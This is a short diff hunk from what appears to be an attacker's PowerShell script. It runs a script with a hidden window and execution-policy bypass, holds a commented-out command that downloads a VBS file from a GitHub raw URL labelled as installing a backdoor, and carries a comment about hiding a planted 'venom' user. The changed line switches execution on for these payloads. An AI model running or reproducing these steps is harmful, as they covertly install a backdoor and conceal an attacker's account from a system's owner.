@@ -70,7 +70,7 @@ powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.ps1
 #visual bsic script to install backdoor
 #Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty2.vbs -OutFile "calty2.vbs"
 
-#./attempt1.exe; ./calty2
+./attempt1.ps1; ./calty2
 
 # hide venom user
 
